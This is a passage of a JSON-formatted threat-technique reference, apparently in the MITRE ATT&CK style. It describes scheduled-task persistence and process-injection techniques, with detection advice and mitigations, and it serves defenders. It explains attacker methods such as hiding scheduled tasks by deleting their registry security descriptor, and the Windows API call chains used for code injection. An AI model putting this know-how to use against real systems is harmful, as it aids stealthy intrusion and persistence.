href=\"https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: 20 macOS Common Tools and Techniques)</a> The <code>cron</code> utility is a time-based job scheduler for Unix-like operating systems.  The <code> crontab</code> file contains the schedule of cron entries to be run and the specified times for execution. Any <code>crontab</code> files are stored in operating system-specific file paths.\n\nAn adversary may use <code>cron</code> in Linux or Unix environments to execute programs at system startup or on a scheduled basis for Persistence. In ESXi environments, cron jobs must be created directly via the crontab file (e.g., <code>/var/spool/cron/crontabs/root</code>). <a href=\"https://www.cloudsek.com/blog/analysis-of-files-used-in-esxiargs-ransomware-attack-against-vmware-esxi-servers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CloudSEK ESXiArgs 2023)</a>","detection":"Monitor scheduled task creation from common utilities using command-line invocation. Legitimate scheduled tasks may be created during installation of new software or through system administration functions. Look for changes to tasks that do not correlate with known software, patch cycles, etc.  \n\nSuspicious program execution through scheduled tasks may show up as outlier processes that have not been seen before when compared against historical data. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.","platforms":["Linux","macOS","ESXi"],"dataSources":["File: File Modification","Process: Process Creation","Scheduled Job: Scheduled Job Creation","Command: Command Execution"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"<code>cron</code> permissions are controlled by <code>/etc/cron.allow and /etc/cron.deny</code>. If there is a <code>cron.allow</code> file, then the user or users that need to use <code>cron</code> will need to be listed in the file. <code>cron.deny</code> is used to explicitly disallow users from using cron. If neither files exist, then only the super user is allowed to run cron."},{"id":"M1047","name":"Audit","description":"Review changes to the <code>cron</code> schedule. <code>cron</code> execution can be reviewed within the <code>/var/log</code> directory. To validate the location of the <code>cron</code> log file, check the syslog config at <code>/etc/rsyslog.conf</code> or <code>/etc/syslog.conf</code>."}]},{"id":"T1053.005","name":"Scheduled Task","description":"Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The schtasks utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. <a href=\"https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Stack Overflow)</a> In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and Windows Management Instrumentation (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet <code>Invoke-CimMethod</code>, which leverages WMI class <code>PS_ScheduledTask</code> to create a scheduled task via an XML path. <a href=\"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1053.005/T1053.005.md\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Red Canary - Atomic Red Team)</a>\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to System Binary Proxy Execution, adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes. <a href=\"https://www.proofpoint.com/us/blog/threat-insight/serpent-no-swiping-new-backdoor-targets-french-entities-unique-attack-chain\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ProofPoint Serpent)</a>\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. Hide Artifacts) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from <code>schtasks /query</code> and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions). <a href=\"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_delete/registry_delete_schtasks_hide_task_via_sd_value_removal.yml\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SigmaHQ)</a> <a href=\"https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Tarrask scheduled task)</a> Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., <code>Index</code> value) within associated registry keys. <a href=\"https://blog.qualys.com/vulnerabilities-threat-research/2022/06/20/defending-against-scheduled-task-attacks-in-windows-environments\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Defending Against Scheduled Task Attacks in Windows Environments)</a>","detection":"Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. <a href=\"https://x.com/leoloobeek/status/939248813465853953\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twitter Leoloobeek Scheduled Task)</a> If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. <a href=\"https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Forum Scheduled Task Operational Setting)</a> Several events will then be logged on scheduled task activity, including: <a href=\"https://technet.microsoft.com/library/dd315590.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduled Task Events)</a> <a href=\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Scheduled Task Events Win10)</a>\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. <a href=\"https://technet.microsoft.com/en-us/sysinternals/bb963902\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Autoruns)</a>\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.","platforms":["Windows"],"dataSources":["Windows Registry: Windows Registry Key Creation","File: File Modification","File: File Creation","Process: Process Creation","Command: Command Execution","Network Traffic: Network Traffic Flow","Scheduled Job: Scheduled Job Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems."},{"id":"M1026","name":"Privileged Account Management","description":"Configure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; User Rights Assignment: Increase scheduling priority. <a href=\"https://technet.microsoft.com/library/dn221960.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Scheduling Priority)</a>"},{"id":"M1028","name":"Operating System Configuration","description":"Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl. The setting can be configured through GPO: Computer Configuration &gt; [Policies] &gt; Windows Settings &gt; Security Settings &gt; Local Policies &gt; Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. <a href=\"https://technet.microsoft.com/library/jj852168.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TechNet Server Operator Scheduled Task)</a>"},{"id":"M1047","name":"Audit","description":"Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. <a href=\"https://github.com/mattifestation/PowerSploit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Powersploit)</a>"}]},{"id":"T1053.006","name":"Systemd Timers","description":"Adversaries may abuse systemd timers to perform task scheduling for initial or recurring execution of malicious code. Systemd timers are unit files with file extension <code>.timer</code> that control services. Timers can be set to run on a calendar event or after a time span relative to a starting point. They can be used as an alternative to Cron in Linux environments. <a href=\"https://wiki.archlinux.org/index.php/Systemd/Timers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: archlinux Systemd Timers Aug 2020)</a> Systemd timers may be activated remotely via the <code>systemctl</code> command line utility, which operates over SSH. <a href=\"https://www.tecmint.com/control-systemd-services-on-remote-linux-server/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Systemd Remote Control)</a>\n\nEach <code>.timer</code> file must have a corresponding <code>.service</code> file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>. <code>.service</code> files are Systemd Service unit files that are managed by the systemd system and service manager. <a href=\"http://man7.org/linux/man-pages/man1/systemd.1.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Linux man-pages: systemd January 2014)</a> Privileged timers are written to <code>/etc/systemd/system/</code> and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.\n\nAn adversary may use systemd timers to execute malicious code at system startup or on a scheduled basis for persistence. <a href=\"https://www.bleepingcomputer.com/news/security/malware-found-in-arch-linux-aur-package-repository/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Arch Linux Package Systemd Compromise BleepingComputer 10JUL2018)</a> <a href=\"https://gist.github.com/campuscodi/74d0d2e35d8fd9499c76333ce027345a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: gist Arch package compromise 10JUL2018)</a> <a href=\"https://lists.archlinux.org/pipermail/aur-general/2018-July/034153.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: acroread package compromised Arch Linux Mail 8JUL2018)</a> Timers installed using privileged paths may be used to maintain root level persistence. Adversaries may also install user level timers to achieve user level persistence. <a href=\"https://www.hybrid-analysis.com/sample/28553b3a9d2ad4361d33d29ac4bf771d008e0073cec01b5561c6348a608f8dd7?environmentId=300\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Falcon Sandbox smp: 28553b3a9d)</a>","detection":"Systemd timer unit files may be detected by auditing file creation and modification events within the <code>/etc/systemd/system</code>, <code>/usr/lib/systemd/system/</code>, and <code>~/.config/systemd/user/</code> directories, as well as associated symbolic links. Suspicious processes or scripts spawned in this manner will have a parent process of ‘systemd’, a parent process ID of 1, and will usually execute as the ‘root’ user.\n\nSuspicious systemd timers can also be identified by comparing results against a trusted system baseline. Malicious systemd timers may be detected by using the systemctl utility to examine system wide timers: <code>systemctl list-timers –all</code>. Analyze the contents of corresponding <code>.service</code> files present on the file system and ensure that they refer to legitimate, expected executables.\n\nAudit the execution and command-line arguments of the 'systemd-run' utility as it may be used to create timers. <a href=\"https://wiki.archlinux.org/index.php/Systemd/Timers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: archlinux Systemd Timers Aug 2020)</a>","platforms":["Linux"],"dataSources":["File: File Modification","Process: Process Creation","Command: Command Execution","Scheduled Job: Scheduled Job Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit user access to system utilities such as 'systemctl' or 'systemd-run' to users who have a legitimate need."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Restrict read/write access to systemd <code>.timer</code> unit files to only select privileged users who have a legitimate need to manage system services."},{"id":"M1026","name":"Privileged Account Management","description":"Limit access to the root account and prevent users from creating and/or modifying systemd timer unit files."}]},{"id":"T1053.007","name":"Container Orchestration Job","description":"Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.\n\nIn Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks. <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/job/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Jobs)</a> <a href=\"https://kubernetes.io/docs/concepts/workloads/controllers/cron-jobs/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes CronJob)</a> An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster. <a href=\"https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Threat Matrix for Kubernetes)</a>","detection":"Monitor for the anomalous creation of scheduled jobs in container orchestration environments. Use logging agents on Kubernetes nodes and retrieve logs from sidecar proxies for application and resource pods to monitor malicious container orchestration job deployments.","platforms":["Containers"],"dataSources":["File: File Creation","Container: Container Creation","Scheduled Job: Scheduled Job Creation"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and remediate privilege escalation vectors so only authorized administrators can create container orchestration jobs."},{"id":"M1026","name":"Privileged Account Management","description":"Ensure containers are not running as root by default. In Kubernetes environments, consider defining Pod Security Standards that prevent pods from running privileged containers. <a href=\"https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kubernetes Hardening Guide)</a>"}]}]},{"id":"T1055","name":"Process Injection","description":"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> \n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods. <em>The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory</em> (Ligh et al., Wiley, 2014) <a href=\"https://www.gnu.org/software/acct/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GNU Acct)</a> <a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RHEL auditd)</a> <a href=\"http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chokepoint preload rootkits)</a> \n\nMonitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules. <a href=\"https://docs.microsoft.com/sysinternals/downloads/sysmon\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Sysmon v6 May 2017)</a> \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Linux","macOS","Windows"],"dataSources":["Process: Process Access","Process: Process Modification","File: File Modification","Process: Process Metadata","File: File Metadata","Process: OS API Execution","Module: Module Load"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) to mitigate ptrace based process injection by restricting the use of ptrace to privileged users only. Other mitigation controls involve the deployment of security kernel modules that provide advanced access control and process restrictions such as SELinux, grsecurity, and AppArmor."},{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process. For example, on Windows 10, Attack Surface Reduction (ASR) rules may prevent Office applications from code injection. <a href=\"https://docs.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: win10_asr)</a>"}],"subTechniques":[{"id":"T1055.001","name":"Dynamic-link Library Injection","description":"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>). <a href=\"https://www.endgame.com/blog/technical-blog/hunting-memory\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic HuntingNMemory June 2017)</a> <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process. <a href=\"https://www.ired.team/offensive-security/code-injection-process-injection/modulestomping-dll-hollowing-shellcode-injection\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Module Stomping for Shellcode Injection)</a> This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk. <a href=\"https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hiding Malicious Code with Module Stomping)</a> \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["Process: Process Metadata","Process: Process Access","Process: Process Modification","Module: Module Load","Process: OS API Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.002","name":"Portable Executable Injection","description":"Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a> \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["Process: Process Access","Process: OS API Execution","Process: Process Modification"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.003","name":"Thread Execution Hijacking","description":"Adversaries may inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. Thread Execution Hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nThread Execution Hijacking is commonly performed by suspending an existing process then unmapping/hollowing its memory, which can then be replaced with malicious code or the path to a DLL. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point the process can be suspended then written to, realigned to the injected code, and resumed via <code>SuspendThread </code>, <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nThis is very similar to Process Hollowing but targets an existing process rather than creating a process in a suspended state.  \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via Thread Execution Hijacking may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["Process: OS API Execution","Process: Process Modification","Process: Process Access"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.004","name":"Asynchronous Procedure Call","description":"Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms681951.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft APC)</a> of a process's thread. Queued APC functions are executed when the thread enters an alterable state. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms681951.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft APC)</a> A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. <a href=\"https://www.cyberbit.com/blog/endpoint-security/new-early-bird-code-injection-technique-discovered/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CyberBit Early Bird Apr 2018)</a> AtomBombing <a href=\"https://blog.ensilo.com/atombombing-brand-new-code-injection-for-windows\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ENSIL AtomBombing Oct 2016)</a> is another variation that utilizes APCs to invoke malicious code previously written to the global atom table. <a href=\"https://msdn.microsoft.com/library/windows/desktop/ms649053.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Atom Table)</a>\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["Process: OS API Execution","Process: Process Access","Process: Process Modification"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.005","name":"Thread Local Storage","description":"Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges. TLS callback injection is a method of executing arbitrary code in the address space of a separate live process. \n\nTLS callback injection involves manipulating pointers inside a portable executable (PE) to redirect a process to malicious code before reaching the code's legitimate entry point. TLS callbacks are normally used by the OS to setup and/or cleanup data used by threads. Manipulating TLS callbacks may be performed by allocating and writing to specific offsets within a process’ memory space using other Process Injection techniques such as Process Hollowing. <a href=\"https://www.fireeye.com/blog/threat-research/2017/11/ursnif-variant-malicious-tls-callback-technique.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye TLS Nov 2017)</a>\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via TLS callback injection may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["Process: Process Modification","Process: Process Access","Process: OS API Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.008","name":"Ptrace System Calls","description":"Adversaries may inject malicious code into processes via ptrace (process trace) system calls in order to evade process-based defenses as well as possibly elevate privileges. Ptrace system call injection is a method of executing arbitrary code in the address space of a separate live process. \n\nPtrace system call injection involves attaching to and modifying a running process. The ptrace system call enables a debugging process to observe and control another process (and each individual thread), including changing memory and register values. <a href=\"http://man7.org/linux/man-pages/man2/ptrace.2.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PTRACE man)</a> Ptrace system call injection is commonly performed by writing arbitrary code into a running process (ex: <code>malloc</code>) then invoking that memory with <code>PTRACE_SETREGS</code> to set the register containing the next instruction to execute. Ptrace 